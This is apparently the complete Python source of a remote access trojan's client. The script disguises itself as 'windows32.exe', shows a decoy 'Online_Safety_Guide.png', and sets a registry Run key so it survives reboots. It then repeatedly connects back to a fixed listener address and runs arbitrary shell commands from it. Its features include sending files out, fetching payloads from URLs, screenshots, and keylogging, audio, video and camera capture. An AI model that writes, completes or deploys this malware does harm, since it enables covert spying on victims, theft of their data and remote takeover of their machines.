#!/usr/bin/python

import socket as sc
import subprocess as sp
import json
import os, sys
import base64
import shutil
from time import *
import requests as rq
from mss import mss
import threading
import keyLogger, soundRecorder, camRecorder



def Send(data):
	
	Data = json.dumps(data)
#	print("Sent : " + Data)
	sock.send(Data)



def Recv():

	data = ""
	while True:
		try:																	# tries to receive 1024 bytes of data from target
			data = data + sock.recv(1024)
#			print("Received : " + data)
			return json.loads(data)
		except ValueError:														# ValueError signifies that the data to be received is larger than 1024 bytes
			continue															# goes back to the loop iteration and adds the remaining data from the execution of try block



# THIS FUNCTION DOWNLOADS FILES FROM THE INTERNET BY PROBING THE SPECIFIED URL (GIVEN IN PARAMETER)
def Download(url):

	get_resp = rq.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as file:
		file.write(get_resp.content)


def Screenshot():
	with mss() as ss:
		ss.shot()


def shell():
	global path, stop_key, stop_rec
	key_isRunning = False
	rec_isRunning = False
	vid_isRunning = False
	while True:
		command = Recv()														# received utf-8 encoded message
		
		# showing the help options 
		#=========================
		if (command[:4] == 'help'):
			help_options = '''\nNote:- All the following commands are Case Sensitive!\n\tAlso please do not confuse them with respective system shell commands!\n

\t(1) help\t\t\t:\tShow this Help menu

\t(2) start <PROGRAM_NAME>\t:\tStart a specified program

\t(3) exit/ quit\t\t\t:\tExit the reverse shell handler

\t(4) get <PATH_TO_FILE>\t\t:\tFetch a file from the target system\n\t\t\t\t\t\tto the current directory of the attacker

\t(5) put <PATH_TO_FILE>\t\t:\tInject a file into the current directory\n\t\t\t\t\t\tof the target system

\t(6) download <URL>\t\t:\tDownload a file from the internet\n\t\t\t\t\t\tinto the target system from the specified URL

\t(7) ss\t\t\t\t:\tCapture a screenshot of the current screen\n\t\t\t\t\t\tof the target system

\t(8) start keylogger\t\t:\tStart recording keystrokes in the target system

\t(9) stop keylogger\t\t:\tStop recording keystrokes\n\t\t\t\t\t\tNote: Keylogger can't be restarted once stopped!

\t(10) dump keys\t\t\t:\tDownload the log file of the recorded keystrokes\n\t\t\t\t\t\tin the current directory of the attacker\n\t\t\t\t\t\tNote:- Only use after stopping Keylogger!

\t(11) start recording\t\t:\tRecord audio input from the default \n\t\t\t\t\t\t audio source of the target.

\t(12) stop recording\t\t:\tStop recording audio

\t(13) record\t\t\t:\tDownload the file of the recorded audio\n\t\t\t\t\t\tin the current directory of the attacker\n\t\t\t\t\t\tNote:- Only use after stopping Recorder!

\t(14) start video\t\t\t:\tStart recording video using the primary camera\n\t\t\t\t\t\tof the target system

\t(15) stop video\t\t\t:\tStop recording the video

\t(16) dump video\t\t\t:\tDownload the recorded video file in attacker's\n\t\t\t\t\t\tcurrent directory\n\t\t\t\t\t\tNote:- Only use after stopping video!

\t(17) capture image\t\t:\tCapture an image from the primary camera\n\t\t\t\t\t\tof the target system [delayed by some frames]\n'''
			Send(help_options)
		
		
		# command to exit the shell
		#===========================
		elif (command == 'exit'):
			break
			
		elif (command == 'quit'):
			continue
		
		elif (command[:2] == 'cd') and (len(command) == 2):
			Send(os.getcwd())
		
		# change directory command (system command - nneds special handling)
		#====================================================================
		elif (command[:2] == 'cd') and (len(command) > 2):
			try:
				os.chdir(command[3:])
				Send("")
			except:
				Send("[!] Invalid path!")
		
		# the GET command [pulling files from target to attacker] - so reverse_shell actually uploads the file
		#======================================================================================================
		elif (command[:3] == 'get'):
			try:
				with open(command[4:], "rb") as file:
					Send(base64.b64encode(file.read()))						# while sending a file, the data is encoded (whcich will then be decodedd in our target system, as we have decoded received file above )
			except:
				Send(os.getcwd())

		
		# the PUT command [injecting files to target from attacker] - so reverse_shell actually downloads the file
		#==========================================================================================================
		elif (command[:3] == 'put'):			
			try:
				if (len(command[4:].split('/')) > 1):
					file = open(command[4:].split('/')[-1], "wb")
				elif (len(command[4:].split('/')) == 0):
					if (len(command[4:].split('\\')) > 1):
						file = open(command[4:].split('\\')[-1], "wb")
				else:
					file = open(command[4:], "wb")
				file_data = Recv()
				file.write(base64.b64decode(file_data))					# the base64 decoding is done to handle non-text file types (such as images) which can't be written directly
				Send("[+] File " + command[4:] + " uploaded to " + os.getcwd())
				file.close()
			except Exception as e:
				Send(e)

		
				
		# the DOWNLOAD command downloads any given file from the internet specified by the URL sent along with the command
		#==================================================================================================================
		elif (command[:8] == 'download'):
			try:
				Download(command[9:])
				Send("[+] File downloaded from " + command[9:] + " to destination " + os.getcwd())
			except:
				Send("[-] Failed to download file downloaded from " + command[9:])
			
		
		
		# the START KEYLOGGER command triggers the keylogger program to run on the target machine and record keystrokes
		#===============================================================================================================
		elif (command == "start keylogger"):
			if key_isRunning:
				Send("[!] Keylogger is already running!")
				continue
			stop_key = threading.Event()
			key_thread = threading.Thread(target=keyLogger.startKL, args=(stop_key,))
			try:
				key_thread.start()
				key_isRunning = True
				Send("[!] Started the keylogger on the target system!")
			except Exception as e:
				Send(str(e))
			
		# dump the recorded keystrokes from target to attacker machine
		#==============================================================	
		elif (command == "dump keys"):
			try:
				keylog = open(keylog_path, "r")
				Send(keylog.read())

			except Exception as e:
				Send("[-] No log file found! Was the Keylogger run properly?")
		
		# the STOP KEYLOGGER command stops the thread for recording keystrokes						!!! DOES NOT WORK !!!		NEED TO FIND A WAY TO STOP/ KILL/ TERMINATE THE THREAD -> key_thread
		#======================================================================
		elif (command == "stop keylogger"):
			if not key_isRunning:
				Send("[!] Keylogger not running!")
				continue
			try:
				stop_key.set()
				key_thread.join()
				key_isRunning = False
				Send("[!] Stopped the keylogger on the target system!")
			except Exception as e:
				Send(str(e))

				
				
		
		elif (command == "start recording"):		
			if rec_isRunning:
				Send("[!] Audio Recorder is already running!")
				continue
			# stop_rec is the event needed to terminate the thread 
			stop_rec = threading.Event()
			# the target function takes in the event as an argument
			rec_thread = threading.Thread(target=soundRecorder.startRecording, args=(stop_rec,))
			try:
				rec_thread.start()
				rec_isRunning = True
				Send("[!] Audio recording started on the target system.")
			except Exception as e:
				Send(str(e))
				
		
		
		elif (command == "record"):
			try:
				with open(rec_path, "rb") as recaudio:
					Send(base64.b64encode(recaudio.read()))
				os.remove(rec_path)
			except Exception as e:
				Send("[-] No record file found! Was the Recorder run properly?")
		
		
		
		elif (command == "stop recording"):
			
			if not rec_isRunning:
				Send("[!] Recorder not running!")
				continue
			# the event is set here, indicating the thread to stop (handled in the target program)
			stop_rec.set()
			try:
				rec_thread.join()	# the threaded program stops here
				rec_isRunning = False
				Send("[!] Stopped recording audio on the target system!")
			except Exception as e:
				Send(str(e))

		
		
		elif (command == "start video"):		
			if vid_isRunning:
				Send("[!] Video Recorder is already running!")
				continue
			# stop_rec is the event needed to terminate the thread 
			stop_vid = threading.Event()
			# the target function takes in the event as an argument
			vid_thread = threading.Thread(target=camRecorder.captureVideo, args=(stop_vid,))
			try:
				vid_thread.start()
				vid_isRunning = True
				Send("[!] Video recording started on the target system.")
			except Exception as e:
				Send(str(e))
				
		
		
		elif (command == "dump video"):
			try:
				with open(vid_path, "rb") as recvideo:
					Send(base64.b64encode(recvideo.read()))
				os.remove(vid_path)
			except Exception as e:
				Send("[-] No record file found! Was the Recorder run properly?")
		
		
		
		elif (command == "stop video"):
			
			if not vid_isRunning:
				Send("[!] Recorder not running!")
				continue
			# the event is set here, indicating the thread to stop (handled in the target program)
			stop_vid.set()
			try:
				vid_thread.join()	# the threaded program stops here
				vid_isRunning = False
				Send("[!] Stopped recording video on the target system!")
			except Exception as e:
				Send(str(e))
				
		
		elif (command == "capture image"):
			try:
				camRecorder.imgCapture()
				with open(img_path, "rb") as img:
					Send(base64.b64encode(img.read()))
				os.remove(img_path)
			except:
				Send("[-] Falied to capture image!")
		


		# the START function starts a given application on the target system and continues on to accepting the next command
		#===================================================================================================================
		elif (command[:5] == 'start'):
			try:
				sp.Popen(command[6:], shell=True)
				Send("[+] " + command[6:] + " started!")
			except:
				Send("[-] Failed to start " + command[6:])
		
		
		
		# the SS command triggers a screenshot of the target system, sends it to the attacker, and deletes the file from the target system as soon as it is sent
		#========================================================================================================================================================
		elif (command[:2] == 'ss'):
			try:
				Screenshot()
				with open("monitor-1.png", "rb") as ss:																						# monitor-1.png IS THE DEFAULT FORMAT OF FILE NAMING BY THE mss LIBRARY
					Send(base64.b64encode(ss.read()))
				os.remove("monitor-1.png")	
			except Exception as e:
				print(e)
				Send("[-] Failed to take Screenshot!")
		
		
		
		else:
			proc = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)	
			res = proc.stdout.read() + proc.stderr.read()
			Send(res.decode())

sock = sc.socket(sc.AF_INET, sc.SOCK_STREAM)

# identifying OS -- checking whether it is a windows OS to create a backdoor
#----------------------------------------------------------------------------
#proc = sp.Popen("pwd", shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)	
#res = proc.stdout.read() + proc.stderr.read()
#if res.decode()[0] != '/':
# CREATING THE BACKDOOR AND HIDING OUR REVERSE SHELL
#===================================================

try:
	loc = os.environ["appdata"] + "\\windows32.exe"
	keylog_path = os.environ["appdata"] + "\\Processes.log"
	rec_path = os.environ["appdata"] + "\\Record.wav"
	vid_path = os.environ["appdata"] + "\\Vid.mp4"
	img_path = os.environ["appdata"] + "\\Image.png"
	if not os.path.exists(loc):													# if the file doesn't exist = program has not run before	;	check fails if file has already been copied once and is running from there
		shutil.copyfile(sys.executable, loc)									# copy the file as an executable to the specified location
# adds registry key to run the program at every reboot of the system
		sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WIN32 /t REG_SZ /d "' + loc + '"', shell=True)		
			
		fopen = sys._MEIPASS + "\Online_Safety_Guide.png"
		try:
			sp.Popen(fopen, shell=True)
		except:
			num_1 = 5
			num_2 = 2
			num_res = num_1 + num_2
except Exception as e:
	print(e)
	path = os.environ["HOME"] + "/Processes.log"
	rec_path = os.environ["HOME"] + "/Record.wav"
	vid_path = os.environ["HOME"] + "/Vid.mp4"	
	img_path = os.environ["HOME"] + "/Image.png"

# details of the listening machine (connect to)
connect_ip = "192.168.0.103"
conn_port = 54321

stop_key = False
stop_rec = False

while True:
	sleep(10)																# tries to connect to the server every n seconds
	try:
		sock.connect((connect_ip, conn_port))
		shell()
		break
	except:
		pass
sock.close()
